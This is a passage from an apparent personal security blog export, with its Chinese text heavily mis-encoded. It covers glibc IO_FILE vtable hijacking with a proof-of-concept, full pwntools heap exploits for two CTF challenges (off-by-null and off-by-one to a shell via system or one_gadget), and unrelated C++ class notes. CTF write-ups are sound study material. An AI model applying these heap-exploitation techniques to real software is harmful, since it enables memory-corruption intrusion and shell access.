åº“ä¸­æ˜¯ç”¨äºæè¿°æ–‡ä»¶çš„ç»“æ„ï¼Œç§°ä¸ºæ–‡ä»¶æµã€‚fileç»“æ„åœ¨ç¨‹åºæ‰§è¡Œï¼Œfreadã€fwrite ç­‰æ ‡å‡†å‡½æ•°éœ€è¦æ–‡ä»¶æµæŒ‡é’ˆæ¥æŒ‡å¼•å»è°ƒç”¨è™šè¡¨å‡½æ•°ã€‚ ç‰¹æ®Šåœ°ï¼Œ fopen ç­‰å‡½æ•°æ—¶ä¼šè¿›è¡Œåˆ›å»ºï¼Œå¹¶åˆ†é…åœ¨å †ä¸­ã€‚æˆ‘ä»¬å¸¸å®šä¹‰ä¸€ä¸ªæŒ‡å‘ fileç»“æ„çš„æŒ‡é’ˆæ¥æ¥æ”¶è¿™ä¸ªè¿”å›å€¼ã€‚ _IO_jump_t: åœ¨ç¬¬äºŒéƒ¨åˆ†ï¼Œåˆšåˆšè°ˆåˆ°çš„è™šè¡¨å°±æ˜¯ _IO_jump_t ç»“æ„ä½“ï¼Œåœ¨æ­¤è™šè¡¨ä¸­ï¼Œæœ‰å¾ˆå¤šå‡½æ•°éƒ½è°ƒç”¨å…¶ä¸­çš„å­å‡½æ•°ï¼Œæ— è®ºæ˜¯å…³é—­æ–‡ä»¶ï¼Œè¿˜æ˜¯æŠ¥é”™è¾“å‡ºç­‰ç­‰ï¼Œéƒ½æœ‰å¯¹åº”çš„å­—æ®µï¼Œè€Œè¿™æ­£æ˜¯å¯ä»¥æ”»å‡»è€…å¯ä»¥è¢«åˆ©ç”¨çš„çªç ´å£ã€‚ å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œåœ¨ _IO_list_all ç»“æ„ä½“ä¸­ï¼Œ_IO_FILE ç»“æ„æ˜¯å®Œæ•´åµŒå…¥å…¶ä¸­ï¼Œè€Œ vtable æ˜¯ä¸€ä¸ªè™šè¡¨æŒ‡é’ˆï¼Œå®ƒæŒ‡å‘äº† _IO_jump_t ç»“æ„ä½“ã€‚ä¸€ä¸ªæ˜¯å®Œæ•´çš„ï¼Œä¸€ä¸ªæ˜¯æŒ‡é’ˆï¼Œè¿™ç‚¹ä¸€å®šè¦åˆ‡è®°ã€‚ åæ­£å¤§è‡´æ˜¯è¿™ä¹ˆä¸ªæµç¨‹å°±å¯¹äº† åˆ©ç”¨æ–¹æ³• ä¼ªé€  vtable åŠ«æŒç¨‹åºæµç¨‹çš„ä¸­å¿ƒæ€æƒ³å°±æ˜¯é’ˆå¯¹_IO_FILE_plus çš„ vtable åŠ¨æ‰‹è„šï¼Œé€šè¿‡æŠŠ vtable æŒ‡å‘æˆ‘ä»¬æ§åˆ¶çš„å†…å­˜ï¼Œå¹¶åœ¨å…¶ä¸­å¸ƒç½®å‡½æ•°æŒ‡é’ˆæ¥å®ç°ã€‚ å› æ­¤ vtable åŠ«æŒåˆ†ä¸ºä¸¤ç§ï¼Œä¸€ç§æ˜¯ç›´æ¥æ”¹å†™ vtable ä¸­çš„å‡½æ•°æŒ‡é’ˆï¼Œé€šè¿‡ä»»æ„åœ°å€å†™å°±å¯ä»¥å®ç°ã€‚å¦ä¸€ç§æ˜¯è¦†ç›– vtable çš„æŒ‡é’ˆæŒ‡å‘æˆ‘ä»¬æ§åˆ¶çš„å†…å­˜ï¼Œç„¶ååœ¨å…¶ä¸­å¸ƒç½®å‡½æ•°æŒ‡é’ˆã€‚ ctf-wikiä¸Šçš„ä¾‹å­ï¼š int main(void) { FILE *fp; long long *vtable_ptr; fp=fopen(&quot;123.txt&quot;,&quot;rw&quot;); vtable_ptr=*(long long*)((long long)fp+0xd8); //get vtable vtable_ptr[7]=0x41414141 //xsputn printf(&quot;call 0x41414141&quot;); } ä¸è¿‡åœ¨ç›®å‰ libc2.23 ç‰ˆæœ¬ä¸‹ï¼Œä½äº libc æ•°æ®æ®µçš„ vtable æ˜¯ä¸å¯ä»¥è¿›è¡Œå†™å…¥çš„ã€‚ ç»è¿‡è°ƒè¯•å‘ç°ç¡®å®æ— æ³•è¿›è¡Œå†™å…¥ã€‚ ä½†æ˜¯æˆ‘ä»¬å¯ä»¥æ¢ä¸€ç§åˆ©ç”¨æ€è·¯ï¼Œå³ä¼ªé€ vtableçš„å½¢å¼æ¥åˆ©ç”¨ #define system_ptr 0x7ffff7a52390; int main(void) { FILE *fp; long long *vtable_addr,*fake_vtable; fp=fopen(&quot;123.txt&quot;,&quot;rw&quot;); fake_vtable=malloc(0x40); vtable_addr=(long long *)((long long)fp+0xd8); //vtable offset vtable_addr[0]=(long long)fake_vtable; memcpy(fp,&quot;sh&quot;,3); fake_vtable[7]=system_ptr; //xsputn fwrite(&quot;hi&quot;,2,1,fp); } åŸç†ï¼švtable ä¸­çš„å‡½æ•°è°ƒç”¨æ—¶ä¼šæŠŠå¯¹åº”çš„_IO_FILE_plus æŒ‡é’ˆä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ä¼ é€’ï¼Œå› æ­¤è¿™é‡Œæˆ‘ä»¬æŠŠ &quot;sh&quot; å†™å…¥_IO_FILE_plus å¤´éƒ¨(å³fp)ã€‚ä¹‹åå¯¹ fwrite çš„è°ƒç”¨å°±ä¼šç»è¿‡æˆ‘ä»¬ä¼ªé€ çš„ vtable æ‰§è¡Œ system(&quot;sh&quot;)ã€‚ å¦‚æœç¨‹åºä¸­ä¸å­˜åœ¨ fopen ç­‰å‡½æ•°åˆ›å»ºçš„_IO_FILE æ—¶ï¼Œä¹Ÿå¯ä»¥é€‰æ‹© stdin\\stdout\\stderr ç­‰ä½äº libc.so ä¸­çš„_IO_FILEï¼Œè¿™äº›æµåœ¨ printf\\scanf ç­‰å‡½æ•°ä¸­å°±ä¼šè¢«ä½¿ç”¨åˆ°ã€‚åœ¨ libc2.23 ä¹‹å‰ï¼Œè¿™äº› vtable æ˜¯å¯ä»¥å†™å…¥å¹¶ä¸”ä¸å­˜åœ¨å…¶ä»–æ£€æµ‹çš„ã€‚ ä¸€äº›æ€è·¯ï¼š ç¨‹åºè°ƒç”¨exitæ—¶ï¼Œä¼šéå†_IO_list_allï¼Œç”¨ IO_2_1_stdout ä¸‹çš„ vatable ä¸­ _setbuf å‡½æ•°ã€‚ ä¾‹é¢˜ [GKCTF2020]Domo åˆ†æå’Œæ€è·¯ mainå‡½æ•° add å‡½æ•°ï¼Œå‘ç°æˆ‘ä»¬å¯ä»¥ç”³è¯·ä¹ä¸ªchunkï¼Œå¹¶ä¸”é¢˜ç›®ç»™æˆ‘ä»¬åŠ äº†ä¸€ä¸ªå¯¹hookå‡½æ•°çš„æ£€æŸ¥ï¼Œå‘ç°ç”³è¯·çš„æ—¶å€™æœ‰ä¸ªoff-by-nullï¼Œæ¯”å¦‚å½“æˆ‘ä»¬ç”³è¯·çš„å—ä¸º0x18æ—¶ï¼Œä¸‹ä¸€ä¸ªchunkçš„sizeä¸ºçš„æœ€åä¸€ä¸ªå­—èŠ‚ä¼šè¢«æˆ‘ä»¬è¦†ç›–ä¸º0 edit å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹ä»»æ„ä¸€ä¸ªåœ°å€çš„ä¸€ä¸ªå­—èŠ‚å†…å®¹ï¼Œä½†æ˜¯editå‡½æ•°åªèƒ½ä½¿ç”¨ä¸€æ¬¡ è¿˜æœ‰showå‡½æ•°å’Œdeleteå‡½æ•°ï¼Œåœ¨æ­¤ä¸ä½œèµ˜è¿° æ€è·¯ï¼š ç¬¬ä¸€æ­¥ï¼šæ³„æ¼åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥ç”³è¯·unsorted binçš„å¤§å°æ¥leak libcçš„åœ°å€ï¼Œå¯ä»¥åˆ©ç”¨fastbinå¤§å°çš„chunkæ¥leak heapæ®µçš„åœ°å€ ç¬¬äºŒæ­¥ï¼šåˆ©ç”¨ off by nullæ¥æ„é€ é‡å çš„chunkï¼Œå‘å‰unlinkï¼Œå¸ƒç½®ä¸€ä¸ªfake chunkï¼Œç„¶åç”³è¯·ä¸€ä¸ªbig chunkè·å¾—ä¸€ä¸ªchunkçš„æ§åˆ¶èƒ½åŠ›ååˆ©ç”¨fastbin attackå¯ä»¥è·å¾—ä¸€ä¸ªåˆé€‚åœ°å€å†™çš„èƒ½åŠ› ç¬¬ä¸‰æ­¥ï¼šæ”»å‡»_IO_2_1_stdin_çš„vtableæŒ‡é’ˆï¼Œåœ¨é™„è¿‘æ„é€ ä¸€ä¸ªfastbin chunkå¹¶åœ¨heapæ®µä¸Šä¼ªé€ ä¸€ä¸ªfake _IO_file_jumpsï¼Œç„¶åå¡«å…¥gadgetï¼Œåˆ©ç”¨å¯å†™èƒ½åŠ›å°†vtableçš„å€¼ä¿®æ”¹åˆ°fake _IO_file_jumpsï¼Œä»è€Œgetshell æ³¨æ„äº‹é¡¹ï¼š 1ï¼Œleak heap addressæ˜¯ä¸ºäº†èƒ½å¤Ÿåœ¨unlinkçš„æ—¶å€™ä¼ªé€ fdå’Œbkç»•è¿‡æ£€æŸ¥ï¼Œå¹¶ä¸”åœ¨åç»­ä¸­æ”¹å†™vtableçš„æ—¶å€™åˆ©ç”¨ 2ï¼Œæ³¨æ„unlinkçš„æ£€æŸ¥ 3ï¼Œç”¨è¿™ä¸ªæ€è·¯è§£é¢˜çš„è¿‡ç¨‹ä¸­å¹¶æ²¡æœ‰ç”¨åˆ°editåŠŸèƒ½ exp: from pwn import * local = 1 if local == 1: p = process('./domo') else: p = remote('node3.buuoj.cn',29623) context.terminal = ['tmux','splitw','-h'] def dbg(): context.log_level = 'debug' def add(size,content): p.sendlineafter('&gt;','1') p.sendlineafter('size:',str(size)) p.sendafter('content:',content) def delete(index): p.sendlineafter('&gt;','2') p.sendlineafter('index:',str(index)) def show(index): p.sendlineafter('&gt;','3') p.sendlineafter('index:',str(index)) def edit(addr,num): p.sendlineafter('&gt;','4') p.sendlineafter('addr:',str(addr)) p.sendafter('num:',num) #dbg() libc = ELF('./libc-2.23.so') print &quot;============= step 1: leak libc and heap addr =================&quot; add(0x80,'aaaaaaaa') #chunk0 add(0x10,'protect') #chunk1 delete(0) add(0x80,'\\x78') #chunk0 #dbg() show(0) libc_base = u64(p.recvuntil('\\x7f')[-6:].ljust(8,'\\x00')) - 88 - 0x10 - libc.sym['__malloc_hook'] print &quot;[*] libc base:&quot; + hex(libc_base) add(0x20,'A') #chunk2 add(0x20,'B') #chunk3 delete(2) delete(3) add(0x20,'a') #chunk2 show(2) heap_addr = u64(p.recvuntil('\\x55')[-6:].ljust(8,'\\x00')) - 0x1061 print &quot;[*] heap address: &quot; + hex(heap_addr) print &quot;=================== step 2: off by null to overlap =================&quot; offset_heap_chunk3 = 0x1120 fake_chunk = heap_addr + offset_heap_chunk3 payload = p64(0) + p64(0xb1) + p64(fake_chunk+0x18) + p64(fake_chunk+0x20) + p64(fake_chunk+0x10) add(0x40,payload) #chunk3 add(0x68,'a') #chunk4 add(0xf0,'b') #chunk5 delete(4) print &quot;====== to use off by null ======&quot; add(0x68,0x60 * '\\x00' + p64(0xb0)) #chunk4 print &quot;===== unlink to overlap =====&quot; delete(5) add(0xc0,'a') #chunk5 add(0x60,'b') #chunk6 delete(6) delete(4) delete(5) #gdb.attach(p) print &quot;============ step 3: to make fake fake_vtable to get shell ================&quot; _IO_2_1_stdin_ = libc_base + libc.sym['_IO_2_1_stdin_'] _IO_file_jumps = libc_base + libc.sym['_IO_file_jumps'] fake_chunk = _IO_2_1_stdin_ + 160 - 3 payload = '\\x00' * 0x38 + p64(0x71) + p64(fake_chunk) add(0xc0,payload) #chunk5 one_gadget = libc_base + 0xf02a4 add(0xa8,p64(0) * 2 + p64(one_gadget) * 19) fake_vtable = heap_addr + 0x1270 payload = '\\x00' * 3 + p64(0) + p64(0) + p64(0) + p64(0) * 2 + p64(fake_vtable) add(0x60,'a') #gdb.attach(p) add(0x60,payload) #gdb.attach(p) p.interactive() ","link":"https://l3mon629.github.io/post/io_file-xue-xi/"},{"title":"ubuntu18ä¸­çš„off-by-one","content":"é€†å‘ mainå‡½æ•° addå‡½æ•°ï¼Œå¯ä»¥å‘ç°æˆ‘ä»¬åªèƒ½åˆ›å»º0x18å’Œ0x38å¤§å°çš„chunkï¼Œè€Œä¸”ç¨‹åºä¼šç»™æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªchunkæ¥ç®¡ç†æˆ‘ä»¬çš„chunk deleteå‡½æ•°ï¼Œå¹¶æ²¡æœ‰UAFæ¼æ´ showå‡½æ•°ï¼Œå¯ä»¥ç”¨æ¥æ³„æ¼åœ°å€ editå‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°å­˜åœ¨off-by-oneæ¼æ´ åˆ©ç”¨æ€è·¯ å›é¡¾ä¸€ä¸‹ubuntu16.04ä¸­çš„åˆ©ç”¨æ€è·¯ï¼š malloc(3ä¸ªchunk) off by oneæº¢å‡ºæ”¹size free1ï¼Œfree2ï¼Œè¿›å»unsorted binï¼Œæ³„æ¼åœ°å€ malloc big chunkï¼Œä¿®æ”¹é‡å chunkçš„fdæŒ‡é’ˆï¼Œç»“æŸã€‚ åœ¨ubuntu18ä¸­å¼•è¿›äº†tcacheæœºåˆ¶ï¼Œä½¿å¾—æ³„æ¼åœ°å€å˜å¾—æ›´ä¸ºå›°éš¾ï¼ˆå› ä¸ºè¦é€ƒé€¸tcache binï¼‰ æ€è·¯å¤§ä½“ç›¸åŒï¼Œä½†æ˜¯åœ¨è°ƒè¯•è¿‡ç¨‹ä¸­è¦æ›´ä¸ºç»†å¿ƒã€‚ æµç¨‹å’Œexp æˆ‘ä»¬å…ˆç”³è¯·ä¸€ä¸ªchunkæ¥çœ‹ä¸€ä¸‹å†…å­˜åˆ†å¸ƒ å¯ä»¥çœ‹åˆ°ç®¡ç†chunkä¸­æœ‰ä¸€ä¸ªæŒ‡é’ˆï¼Œæˆ‘ä»¬æƒ³åŠæ³•æ¥æ§åˆ¶å®ƒ é¦–å…ˆè¦æƒ³åŠæ³•æ¥æ³„æ¼åœ°å€ï¼Œç”±äºæˆ‘ä»¬åªèƒ½mallocä¸¤ç§sizeçš„chunkï¼Œæˆ‘ä»¬åªèƒ½æ„é€ å‡º0x41çš„chunkä½œä¸ºbig chunkï¼ŒæŠŠä¸€ä¸ªç®¡ç†chunkåŒ…å«è¿›å»ï¼Œç„¶åfreeæ‰bigchunkï¼Œè¿™ä¸ªæ—¶å€™tcache binsé‡Œé¢æœ‰ä¸¤ä¸ªchunkï¼Œä¸€ä¸ªæ˜¯0x40å¤§å°ä¸€ä¸ªæ˜¯0x20å¤§å°ï¼Œæˆ‘ä»¬è¿™ä¸ªæ—¶å€™malloc(0x38)å¤§å°çš„chunkï¼Œå¯ä»¥æŠŠ0x20ä½œä¸ºæ§åˆ¶ä¿¡æ¯ï¼Œ0x40ä½œä¸ºmem chunkï¼Œä½†æ˜¯æ³¨æ„ï¼Œæˆ‘ä»¬ä¹‹å‰çš„bigchunkæ°å¥½æ˜¯ç®¡ç†chunkï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬æ‹¥æœ‰äº†å‘ç®¡ç†chunkå†…å†™å…¥çš„èƒ½åŠ›ã€‚ æˆ‘ä»¬å¯ä»¥å†™å…¥elf.got['free']ï¼Œç„¶åshowä¸€ä¸‹ï¼Œæ³„æ¼å‡º__libc_freeï¼Œç„¶åè¦†ç›–freeä¸ºsystemï¼Œå°±èƒ½æ‹¿shelläº† exp: from pwn import * from LibcSearcher import * local = 1 if local == 1: p = process('./npuctf_2020_easyheap') else: p = remote('node3.buuoj.cn',26806) elf = ELF('./npuctf_2020_easyheap') libc = ELF('./libc-2.27.so') def dbg(): context.log_level = 'debug' def add(size,content): p.sendlineafter('Your choice :','1') p.sendlineafter('Size of Heap(0x10 or 0x20 only) :',str(size)) p.sendafter('Content:',content) def edit(index,content): p.sendlineafter('Your choice :','2') p.sendlineafter('Index :',str(index)) p.sendafter('Content:',content) def show(index): p.sendlineafter('Your choice :','3') p.sendlineafter('Index :',str(index)) def free(index): p.sendlineafter('Your choice :','4') p.sendlineafter('Index :',str(index)) add(0x18,'a') #chunk 0 pause() add(0x18,'aaaaaaaa') #chunk 1 add(0x18,'AAAAAAAA') #chunk 2 payload = b'/bin/sh;' + 0x10 * b'A' + b'\\x41' edit(0,payload) free(1) payload = p64(0) * 3 + p64(0x21) + p64(0x38) + p64(elf.got['free']) #payload = p64(0) * 3 + p64(0x21) + p64(0x38) + p64(elf.got['atoi']) add(0x38,payload) #chunk 1 #dbg() show(1) free_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8,b'\\x00')) print(&quot;[*] free address: &quot;,hex(free_addr)) ''' #libc_base = free_addr - 0x81540 libc_base = free_addr - 0x35e40 __free_hook = libc_base + 0x3b48e8 system_addr = libc_base + 0x41af0 print(&quot;[*] libc_base ---&gt; &quot;,hex(libc_base)) #print(&quot;[*] __free_hook ---&gt; &quot;,hex(__free_hook)) print(&quot;[*] system_addr ----&gt; &quot;,hex(system_addr)) ''' libc = LibcSearcher('free',free_addr) libc_base = free_addr - libc.dump('free') print(&quot;[*] libc_base : &quot;,hex(libc_base)) system_addr = libc_base + libc.dump('system') print(&quot;[*] system_addr ----&gt; &quot;,hex(system_addr)) payload = p64(system_addr) edit(1,payload) free(0) p.interactive() ","link":"https://l3mon629.github.io/post/ubuntu18-zhong-de-off-by-one/"},{"title":"C++å­¦ä¹ ","content":"ç”±äºæœ€è¿‘å­¦æ ¡å¼€äº†æ•°æ®ç»“æ„ï¼Œè€Œä¸”æ˜¯ä»¥c++è¯­è¨€æ¥æè¿°ï¼Œç”±äºæœ¬èœé¸¡è½¬ä¸“ä¸šå¹¶æ²¡æœ‰æ¥è§¦è¿‡c++ï¼Œç‰¹æ­¤æ¥è¡¥ä¹ ä¸€ä¸‹ï¼Œæš‚åœPHPçš„å­¦ä¹ ã€‚ ç±» ç®€å•ç«‹æ–¹ä½“ç±»è®¾è®¡ #include &lt;iostream&gt; #include &lt;string&gt; using namespace std; class Cube{ private: int m_L; int m_H; int m_W; public: //è®¾ç½®é•¿å®½é«˜ void set_L(int l) { m_L = l; } void set_H(int h) { m_H = h; } void set_W(int w) { m_W = w; } //è·å–é•¿å®½é«˜ int get_L() { return m_L; } int get_H() { return m_H; } int get_W() { return m_W; } //è·å–é¢ç§¯ int get_area() { return 2 * (m_L * m_W + m_L * m_H + m_H * m_W); } //è·å–ä½“ç§¯ int get_volume() { return m_W * m_L * m_H; } // æˆå‘˜å‡½æ•°åˆ¤æ–­ä¸¤ä¸ªç«‹æ–¹ä½“æ˜¯å¦ç›¸ç­‰ bool isSame(Cube &amp;c1) { if(m_H == c1.get_H() &amp;&amp; m_W == c1.get_W() &amp;&amp; m_L == c1.get_L()) { return true; } else return false; } }; //å…¨å±€å‡½æ•°åˆ¤æ–­ä¸¤ä¸ªç«‹æ–¹ä½“æ˜¯å¦ç›¸ç­‰ /* bool isSame(Cube &amp;c1,Cube &amp;c2) { if(c1.get_H() == c2.get_H() &amp;&amp; c1.get_W() == c2.get_W() &amp;&amp; c1.get_L() == c2.get_L()) { return true; } else return false; } */ int main(int argc, char const *argv[]) { Cube c1,c2; c1.set_W(10); c1.set_H(10); c1.set_L(10); c2.set_W(20); c2.set_L(20); c2.set_H(20); cout &lt;&lt; &quot;c1çš„é•¿å®½é«˜ä¸ºï¼š&quot; &lt;&lt; c1.get_L() &lt;&lt; &quot;,&quot; &lt;&lt; c1.get_W() &lt;&lt; &quot;,&quot; &lt;&lt; c1.get_H() &lt;&lt; endl; cout &lt;&lt; &quot;c2çš„é•¿å®½é«˜ä¸ºï¼š&quot; &lt;&lt; c2.get_L() &lt;&lt; &quot;,&quot; &lt;&lt; c2.get_W() &lt;&lt; &quot;,&quot; &lt;&lt; c2.get_H() &lt;&lt; endl; cout &lt;&lt; &quot;c1çš„é¢ç§¯å’Œä½“ç§¯ï¼š&quot; &lt;&lt; c1.get_area() &lt;&lt; &quot;,&quot; &lt;&lt; c1.get_volume() &lt;&lt; endl; /* bool is_s = isSame(c1,c2); if(is_s == true) cout &lt;&lt; &quot;c1å’Œc2ç›¸ç­‰&quot; &lt;&lt; endl; else cout &lt;&lt; &quot;c1å’Œc2ä¸ç›¸ç­‰&quot; &lt;&lt; endl; */ bool is_s = c1.isSame(c2); if(is_s == true) cout &lt;&lt; &quot;c1å’Œc2ç›¸ç­‰&quot; &lt;&lt; endl; else cout &lt;&lt; &quot;c1å’Œc2ä¸ç›¸ç­‰&quot; &lt;&lt; endl; return 0; } ##æ„é€ å‡½æ•°å’Œææ„å‡½æ•° åˆæ­¥è®¤è¯† #include &lt;iostream&gt; #include &lt;string&gt; using namespace std; //æ„é€ å‡½æ•°å’Œææ„å‡½æ•° //æ„é€ å‡½æ•°ï¼šåˆ›å»ºå¯¹è±¡æ—¶è‡ªåŠ¨è°ƒç”¨ //ææ„å‡½æ•°ï¼šå¯¹è±¡é”€æ¯æ—¶è‡ªåŠ¨è°ƒç”¨ class Person { //1.1æ„é€ å‡½æ•° //æ²¡æœ‰è¿”å›å€¼ï¼Œä¹Ÿä¸ç”¨å†™void //å‡½æ•°åä¸ç±»åç›¸åŒï¼Œå¯ä»¥å‘ç”Ÿé‡è½½ public: Person() { cout &lt;&lt; &quot;æ„é€ å‡½æ•°è‡ªåŠ¨è°ƒç”¨&quot; &lt;&lt; endl; } ~Person() { cout &lt;&lt; &quot;ææ„å‡½æ•°çš„è°ƒç”¨&quot; &lt;&lt; endl; } }; int main() { Person p1; } è¿è¡Œç»“æœï¼š æ„é€ å‡½æ•°çš„åˆ†ç±»åŠè°ƒç”¨ #include &lt;iostream&gt; #include &lt;string&gt; using namespace std; /* ä¸¤ç§åˆ†ç±»æ–¹å¼ï¼š 1ï¼Œå‚æ•°åˆ†ï¼šæœ‰å‚æ„é€ å’Œæ— å‚æ„é€  2ï¼Œç±»å‹åˆ†ï¼šæ™®é€šæ„é€ å’Œæ‹·è´æ„é€  ä¸‰ç§è°ƒç”¨æ–¹æ³•ï¼š 1ï¼Œæ‹¬å·æ³• 2ï¼Œæ˜¾ç¤ºæ³• 3ï¼Œéšå¼æ„é€ æ³• */ class Person { //æ„é€ å‡½æ•° public: Person() { cout &lt;&lt; &quot;Personçš„æ— å‚æ„é€ å‡½æ•°è°ƒç”¨ï¼ˆé»˜è®¤æ„é€ ï¼‰&quot; &lt;&lt; endl; } Person(int a) { cout &lt;&lt; &quot;Personçš„æœ‰å‚æ„é€ å‡½æ•°è°ƒç”¨&quot; &lt;&lt; endl; } //æ‹·è´æ„é€ å‡½æ•° Person(const Person &amp;p) { //å°†ä¼ å…¥çš„å¯¹è±¡çš„æ‰€æœ‰å±æ€§ æ‹·è´åˆ°â€˜æˆ‘â€™èº«ä¸Š cout &lt;&lt; &quot;Personçš„æ‹·è´æ„é€ å‡½æ•°è°ƒç”¨&quot; &lt;&lt; endl; } }; //è°ƒç”¨ void test() { //1ï¼Œæ‹¬å·æ³• Person p; //é»˜è®¤æ„é€ å‡½æ•°è°ƒç”¨ Person p1(10);//æœ‰å‚æ„é€ å‡½æ•° Person p2(p1); //2ï¼Œæ˜¾ç¤ºæ³• //3ï¼Œéšå¼è½¬æ¢æ³• } int main() { test(); } #include &lt;iostream&gt; #include &lt;string&gt; using namespace std; /* ä¸¤ç§åˆ†ç±»æ–¹å¼ï¼š 1ï¼Œå‚æ•°åˆ†ï¼šæœ‰å‚æ„é€ å’Œæ— å‚æ„é€  2ï¼Œç±»å‹åˆ†ï¼šæ™®é€šæ„é€ å’Œæ‹·è´æ„é€  ä¸‰ç§è°ƒç”¨æ–¹æ³•ï¼š 1ï¼Œæ‹¬å·æ³• 2ï¼Œæ˜¾ç¤ºæ³• 3ï¼Œéšå¼æ„é€ æ³• */ class Person { //æ„é€ å‡½æ•° public: Person() { cout &lt;&lt; &quot;Personçš„æ— å‚æ„é€ å‡½æ•°è°ƒç”¨ï¼ˆé»˜è®¤æ„é€ ï¼‰&quot; &lt;&lt; endl; } Person(int a) { cout &lt;&lt; &quot;Personçš„æœ‰å‚æ„é€ å‡½æ•°è°ƒç”¨&quot; &lt;&lt; endl; } //æ‹·è´æ„é€ å‡½æ•° Person(const Person &amp;p) { //å°†ä¼ å…¥çš„å¯¹è±¡çš„æ‰€æœ‰å±æ€§ æ‹·è´åˆ°â€˜æˆ‘â€™èº«ä¸Š cout &lt;&lt; &quot;Personçš„æ‹·è´æ„é€ å‡½æ•°è°ƒç”¨&quot; &lt;&lt; endl; } }; //è°ƒç”¨ void test() { //1ï¼Œæ‹¬å·æ³• // Person p; //é»˜è®¤æ„é€ å‡½æ•°è°ƒç”¨ // Person p1(10);//æœ‰å‚æ„é€ å‡½æ•° // Person p2(p1); //æ³¨æ„äº‹é¡¹ï¼šè°ƒç”¨é»˜è®¤æ„é€ å‡½æ•°çš„æ—¶å€™ï¼Œä¸è¦åŠ æ‹¬å·ï¼ˆç¼–è¯‘å™¨ä¼šè®¤ä¸ºæ˜¯ä¸€ä¸ªå‡½æ•°çš„å£°æ˜ï¼‰ //2ï¼Œæ˜¾ç¤ºæ³• Person p; Person p2 = Person(10); Person p3 = Person(p2); //ç­‰å·å³ä¾§çš„éƒ¨åˆ†å«åšåŒ¿åå¯¹è±¡ï¼šå½“å‰è¡Œæ‰§è¡Œç»“æŸåï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨å›æ”¶æ‰å¯¹è±¡ //3ï¼Œéšå¼è½¬æ¢æ³• } int main() { test(); } æ‰§è¡Œç»“æœå¦‚ä¸Šå›¾ #include &lt;iostream&gt; #include &lt;string&gt; using namespace std; /* ä¸¤ç§åˆ†ç±»æ–¹å¼ï¼š 1ï¼Œå‚æ•°åˆ†ï¼šæœ‰å‚æ„é€ å’Œæ— å‚æ„é€  2ï¼Œç±»å‹åˆ†ï¼šæ™®é€šæ„é€ å’Œæ‹·è´æ„é€  ä¸‰ç§è°ƒç”¨æ–¹æ³•ï¼š 1ï¼Œæ‹¬å·æ³• 2ï¼Œæ˜¾ç¤ºæ³• 3ï¼Œéšå¼æ„é€ æ³• */ class Person { //æ„é€ å‡½æ•° public: Person() { cout &lt;&lt; &quot;Personçš„æ— å‚æ„é€ å‡½æ•°è°ƒç”¨ï¼ˆé»˜è®¤æ„é€ ï¼‰&quot; &lt;&lt; endl; } Person(int a) { cout &lt;&lt; &quot;Personçš„æœ‰å‚æ„é€ å‡½æ•°è°ƒç”¨&quot; &lt;&lt; endl; } //æ‹·è´æ„é€ å‡½æ•° Person(const Person &amp;p) { //å°†ä¼ å…¥çš„å¯¹è±¡çš„æ‰€æœ‰å±æ€§ æ‹·è´åˆ°â€˜æˆ‘â€™èº«ä¸Š cout &lt;&lt; &quot;Personçš„æ‹·è´æ„é€ å‡½æ•°è°ƒç”¨&quot; &lt;&lt; endl; } }; //è°ƒç”¨ void test() { //1ï¼Œæ‹¬å·æ³• // Person p; //é»˜è®¤æ„é€ å‡½æ•°è°ƒç”¨ // Person p1(10);//æœ‰å‚æ„é€ å‡½æ•° // Person p2(p1); //æ³¨æ„äº‹é¡¹ï¼šè°ƒç”¨é»˜è®¤æ„é€ å‡½æ•°çš„æ—¶å€™ï¼Œä¸è¦åŠ æ‹¬å·ï¼ˆç¼–è¯‘å™¨ä¼šè®¤ä¸ºæ˜¯ä¸€ä¸ªå‡½æ•°çš„å£°æ˜ï¼‰ //2ï¼Œæ˜¾ç¤ºæ³• // Person p; // Person p1 = Person(10); // Person p2 = Person(p2); //ç­‰å·å³ä¾§çš„éƒ¨åˆ†å«åšåŒ¿åå¯¹è±¡ï¼šå½“å‰è¡Œæ‰§è¡Œç»“æŸåï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨å›æ”¶æ‰å¯¹è±¡ //3ï¼Œéšå¼è½¬æ¢æ³•ã€ Person p; Person p1 = 10; Person p2 = p1; } int main() { test(); } æ‹·è´æ„é€ å‡½æ•°çš„è°ƒç”¨æ—¶æœº #include &lt;iostream&gt; using namespace std; //æ‹·è´å‡½æ•°çš„è°ƒç”¨æ—¶æœº //1ï¼Œä½¿ç”¨ä¸€ä¸ªå·²ç»åˆ›å»ºå®Œæ¯•çš„å¯¹è±¡æ¥åˆå§‹åŒ–ä¸€ä¸ªæ–°å¯¹è±¡ //2ï¼Œå€¼ä¼ é€’çš„æ–¹å¼ç»™å‡½æ•°å‚æ•°ä¼ å€¼ //3ï¼Œå€¼æ–¹å¼è¿”å›å±€éƒ¨å¯¹è±¡ class Person { public: Person() { cout &lt;&lt; &quot;Personé»˜è®¤æ„é€ å‡½æ•°è°ƒç”¨&quot; &lt;&lt; endl; } Person(int age) { m_age = age; cout &lt;&lt; &quot;Personæœ‰å‚æ„é€ å‡½æ•°è°ƒç”¨&quot; &lt;&lt; endl; } Person(const Person &amp; p) { m_age = p.m_age; cout &lt;&lt; &quot;Personæ‹·è´æ„é€ å‡½æ•°è°ƒç”¨&quot; &lt;&lt; endl; } ~Person() { cout &lt;&lt; &quot;Personææ„å‡½æ•°è°ƒç”¨&quot; &lt;&lt; endl; } } void method_by_exchange(Person p) { } int main() { //Person p1(20); //Person p2(p1); //cout &lt;&lt; &quot;p2çš„å¹´é¾„ï¼š&quot; &lt;&lt; p2.m_age &lt;&lt; endl; //2ï¼Œå€¼ä¼ é€’çš„æ–¹å¼ç»™å‡½æ•°å‚æ•°ä¼ å€¼ Person p; method_by_exchange(p); } æ·±æ‹·è´ä¸æµ…æ‹·è´ æµ…æ‹·è´å¸¦æ¥çš„é—®é¢˜ï¼š #include &lt;iostream&gt; using namespace std; //å‰ç½®çŸ¥è¯†ï¼šå½“ä¸€ä¸ªç±»åˆå§‹åŒ–çš„æ—¶å€™ï¼Œå•¥æ„é€ 